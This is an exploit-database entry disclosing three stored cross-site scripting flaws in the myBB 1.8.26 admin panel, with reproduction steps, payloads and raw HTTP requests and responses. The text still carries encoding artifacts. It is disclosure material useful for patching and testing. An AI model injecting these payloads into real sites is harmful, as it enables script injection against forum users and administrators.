@@ -1,0 +1,181 @@
+id: 38381
+date: 03/30/2023
+title: myBB forums 1.8.26 - Stored Cross-Site Scripting Vulnerability
+author: Andrey Stoykov
+cves: 
+
+# Exploit Title: myBB forums 1.8.26 - Stored Cross-Site Scripting (XSS) 
+# Exploit Author: Andrey Stoykov
+# Software Link: https://mybb.com/versions/1.8.26/
+# Version: 1.8.26
+# Tested on: Ubuntu 20.04
+
+Stored XSS #1:
+
+
+To reproduce do the following:
+
+1. Login as administrator user
+2. Browse to "Templates and Style" -> "Templates" -> "Manage Templates" -> =
+"Global Templates"=20
+3. Select "Add New Template" and enter payload "><img src=3Dx onerror=3Dale=
+rt(1)>
+
+
+// HTTP POST request showing XSS payload
+
+POST /mybb_1826/admin/index.php?module=3Dstyle-templates&action=3Dedit_temp=
+late HTTP/1.1
+Host: 192.168.139.132
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100=
+101 Firefox/106.0
+[...]
+
+my_post_key=3D60dcf2a0bf3090dbd2c33cd18733dc4c&title=3D"><img+src=3Dx+onerr=
+or=3Dalert(1)>&sid=3D-1&template=3D&continue=3DSave+and+Continue+Editing
+
+
+// HTTP redirect response to specific template
+
+HTTP/1.1 302 Found
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev P=
+erl/v5.16.3
+Location: index.php?module=3Dstyle-templates&action=3Dedit_template&title=
+=3D%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&sid=3D-1
+[...]
+
+
+// HTTP GET request to newly created template
+
+GET /mybb_1826/admin/index.php?module=3Dstyle-templates&sid=3D-1 HTTP/1.1
+Host: 192.168.139.132
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100=
+101 Firefox/106.0
+[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev P=
+erl/v5.16.3
+X-Powered-By: PHP/5.6.40
+[...]
+
+<tr class=3D"first">
+<td class=3D"first"><a href=3D"index.php?module=3Dstyle-templates&actio=
+n=3Dedit_template&title=3D%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3=
+E&sid=3D-1">"><img src=3Dx onerror=3Dalert(1)></a></td>
+[...]
+
+
+Stored XSS #2:
+
+To reproduce do the following:
+
+1. Login as administrator user
+2. Browse to "Forums and Posts" -> "Forum Management"
+3. Select "Add New Forum" and enter payload "><script>alert(1)</script>
+
+
+// HTTP POST request showing XSS payload
+
+POST /mybb_1826/admin/index.php?module=3Dforum-management&action=3Dadd HTTP=
+/1.1
+Host: 192.168.139.132
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100=
+101 Firefox/106.0
+[...]
+
+my_post_key=3D60dcf2a0bf3090dbd2c33cd18733dc4c&type=3Df&title=3D"><script>a=
+lert(1)</script>&description=3D"><script>alert(2)</script[...]
+
+
+// HTTP response showing successfully added a new forum
+
+HTTP/1.1 200 OK
+Date: Sun, 20 Nov 2022 11:00:28 GMT
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev P=
+erl/v5.16.3
+[...]
+
+
+// HTTP GET request to fetch forums
+
+GET /mybb_1826/admin/index.php?module=3Dforum-management HTTP/1.1
+Host: 192.168.139.132
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100=
+101 Firefox/106.0
+[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev P=
+erl/v5.16.3
+[...]
+
+<small>Sub Forums:  <a href=3D"index.php?module=3Dforum-management&fid=
+=3D3">"><script>alert(1)</script></a></small>
+
+
+Stored XSS #3:
+
+
+To reproduce do the following:
+
+1. Login as administrator user
+2. Browse to "Forums and Posts" -> "Forum Announcements"
+3. Select "Add Announcement" and enter payload "><img+src=3Dx+onerror=3Dale=
+rt(1)>
+
+
+// HTTP POST request showing XSS payload
+
+POST /mybb_1826/admin/index.php?module=3Dforum-announcements&action=3Dadd H=
+TTP/1.1
+Host: 192.168.139.132
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100=
+101 Firefox/106.0
+[...]
+
+my_post_key=3D60dcf2a0bf3090dbd2c33cd18733dc4c&title=3D"><img+src=3Dx+onerr=
+or=3Dalert(1)>&starttime_day=3D20&starttime_month=3D11&starttime_year=3D202=
+2&starttime_time=3D11:05+AM&endtime_day=3D20&endtime_month=3D11&endtime_yea=
+r=3D2023&endtime_time=3D11:05+AM&endtime_type=3D2&message=3D"><script>alert=
+(2)</script>&fid=3D2&allowmycode=3D1&allowsmilies=3D1
+
+
+// HTTP response showing successfully added an anouncement
+
+HTTP/1.1 302 Found
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev P=
+erl/v5.16.3
+[...]
+
+
+// HTTP GET request to fetch forum URL
+
+GET /mybb_1826/ HTTP/1.1
+Host: 192.168.139.132
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100=
+101 Firefox/106.0
+[...]
+
+
+// HTTP response showing unsanitized XSS payload
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev P=
+erl/v5.16.3
+[...]
+
+<a href=3D"forumdisplay.php?fid=3D3" title=3D"">"><script>alert(1)</script>=
+</a>
+
+
+
+--sgnirk-590ebdc0-1da1-4f35-a731-39a2519b1c0d--
+
+#  0day.today [2023-04-04]  #
